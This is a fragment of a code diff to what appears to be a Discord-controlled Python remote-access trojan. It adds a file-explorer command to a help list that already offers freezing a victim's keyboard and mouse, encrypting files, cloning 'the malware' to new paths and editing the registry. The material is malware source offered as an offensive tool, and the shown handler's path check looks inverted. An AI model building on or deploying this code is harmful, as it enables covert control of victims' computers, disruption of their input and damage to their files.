@@ -172,6 +172,7 @@ commands = "\n\r".join([
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
     "decrypt <key or keys separated by commas(",") without spaces> <file> - Decrypt an file",
     "encrypt <number of times to encrypt> <file> - Encrypt an file",
+    "fs - FS explorer, optional: fs <path>",
     "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
     "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
     "!quit - Exit session without deleting all the data",
@@ -993,7 +994,7 @@ async def on_message(message):
 
 #! FILE EXPLORER
     elif message.content.startswith("fs"):
-        
+
         path = message.content[3:]
         if os.path.isdir(path): 
             await message.reply("Invalid path!")
